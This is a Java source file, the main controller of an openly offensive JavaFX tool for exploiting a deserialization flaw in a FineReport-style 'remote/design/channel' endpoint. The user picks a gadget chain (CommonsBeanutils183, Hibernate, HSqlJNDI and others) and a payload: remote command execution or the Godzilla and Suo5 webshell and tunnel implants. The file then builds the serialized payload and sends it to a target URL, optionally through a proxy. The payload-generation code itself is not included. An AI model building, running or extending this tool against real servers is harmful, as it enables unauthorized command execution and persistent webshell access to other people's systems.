package com.h2tg.frchannel;

import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.fxml.Initializable;
import javafx.geometry.Insets;
import javafx.geometry.Pos;
import javafx.scene.control.*;
import javafx.scene.layout.GridPane;
import javafx.scene.layout.HBox;
import javafx.stage.Window;
import javafx.util.Pair;
import org.apache.http.HttpHost;
import java.net.URL;
import java.util.ResourceBundle;

import static com.h2tg.frchannel.Utils.*;

public class MainController implements Initializable
{
    private HttpHost PROXY = null;
    private String HOST = "127.0.0.1";
    private int PORT = 8080;

    @FXML
    public Menu ProxyLog;

    @FXML
    public ComboBox gadget;

    @FXML
    public ComboBox payload;

    @FXML
    private TitledPane TP;

    @FXML
    private TextField arg;

    @FXML
    private TextField url;

    @FXML
    private TextArea output;

    // 初始化
    @Override
    public void initialize(URL location, ResourceBundle resources)
    {

        this.TP.setCollapsible(false);
        this.output.setText(banner);

        ObservableList<String> gadgets = FXCollections.observableArrayList(
                "JacksonSignedObject",
                "Hibernate",
                "CommonsBeanutils183",
                "HSqlDeserialize",
                "HSqlJNDI",
                "URLDNS");

        ObservableList<String> payloads = FXCollections.observableArrayList(
                "CmdExec",
                "Godzilla",
                "Suo5",
                "Other");

        this.gadget.setItems(gadgets);
        this.payload.setItems(payloads);
    }

    // 注意事项
    public void notice(ActionEvent actionEvent)
    {
        Alert alert = new Alert(Alert.AlertType.INFORMATION);
        alert.setTitle("注意事项");
        alert.setHeaderText(null);
        alert.setContentText(banner);
        alert.showAndWait();
    }

    public void exploit(ActionEvent actionEvent)
    {
        String url = this.url.getText();
        String arg = this.arg.getText();
        String gadget = this.gadget.getValue().toString();
        String payload = this.payload.getValue().toString();

        if (checkUrl(url)) {
            if (check(gadget) && check(payload)) {
                if (payload.equals("CmdExec") && arg.isEmpty()) {
                    this.output.setText("Please Input Command !!!");
                } else {
                    try {
                        byte[] bytes = generate(gadget, payload);
                        if (!payload.equals("CmdExec")) {
                            arg = null;
                        }
                        String res = send(url, bytes, arg, this.PROXY);
                        this.output.setText(res);
                    } catch (Exception e) {
                        this.output.setText("Error: " + e.getMessage());
                    }

                }
            } else {
                this.output.setText("Please Select Gadget and Payload !!!");
            }
        } else {
            this.output.setText("Please Input Vul Url !!!\n" +
                    "Like: http://192.168.60.128:37799/webroot/decision/remote/design/channel");
        }
    }


    public void proxy(ActionEvent actionEvent)
    {
        Dialog<Pair<String, String>> dialog = new Dialog<>();
        Window window = dialog.getDialogPane().getScene().getWindow();
        window.setOnCloseRequest((e) -> {
            window.hide();
        });
        dialog.setTitle("Setting Proxy");
        dialog.setHeaderText(null);

        GridPane grid = new GridPane();
        grid.setHgap(10);
        grid.setVgap(20);
        grid.setPadding(new Insets(20, 30, 10, 10));

        ToggleGroup group = new ToggleGroup();
        RadioButton enableRadio = new RadioButton("启用");
        enableRadio.setSelected(true);
        enableRadio.setMinWidth(90.0);
        RadioButton disableRadio = new RadioButton("禁用");
        disableRadio.setMinWidth(90.0);
        enableRadio.setToggleGroup(group);
        disableRadio.setToggleGroup(group);
        HBox hbox = new HBox();
        hbox.setSpacing(20.0);
        hbox.getChildren().add(enableRadio);
        hbox.getChildren().add(disableRadio);

        ComboBox<String> typeCombo = new ComboBox();
        typeCombo.setItems(FXCollections.observableArrayList(new String[]{"HTTP"}));
        typeCombo.getSelectionModel().select(0);
        typeCombo.setMinWidth(200);

        TextField host = new TextField();
        TextField port = new TextField();
        if (HOST != null) {
            host.setText(HOST);
            port.setText(String.valueOf(PORT));
        }

        Button cancelBtn = new Button("退出");
        cancelBtn.setMinWidth(90.0);
        cancelBtn.setOnAction((e) -> {
            dialog.getDialogPane().getScene().getWindow().hide();
        });
        Button saveBtn = new Button("保存");
        saveBtn.setMinWidth(90.0);
        saveBtn.setOnAction((e) -> {
            if (enableRadio.isSelected()) {
//                System.out.println(host.getText());
                if (!(host.getText().isEmpty() || port.getText().isEmpty())) {
                    HOST = host.getText();
                    PORT = Integer.parseInt(port.getText());
                    if (typeCombo.getValue().equals("HTTP")) {
                        HttpHost proxy = new HttpHost(HOST, PORT);
                        this.PROXY = proxy;
                        this.ProxyLog.setText("ProxyLog：Start HTTP @ /" + HOST + ":" + PORT + " ...");
                    }
                } else {
                    this.ProxyLog.setText("ProxyLog：Please Input Host and Port ...");
                }
            } else {
                this.ProxyLog.setText(null);
                HOST = null;
                this.PROXY = null;
            }
            System.out.println(this.PROXY);

        });

        HBox hbox2 = new HBox();
        hbox2.getChildren().add(saveBtn);
        hbox2.getChildren().add(cancelBtn);
        hbox2.setSpacing(20.0);
        hbox2.setAlignment(Pos.CENTER);

        grid.add(hbox, 1, 0);
        grid.add(new Label("Type："), 0, 1);
        grid.add(typeCombo, 1, 1);
        grid.add(new Label("Host："), 0, 2);
        grid.add(host, 1, 2);
        grid.add(new Label("Port："), 0, 3);
        grid.add(port, 1, 3);
        grid.add(hbox2, 1, 4);

        dialog.getDialogPane().setContent(grid);
        dialog.showAndWait();
    }


}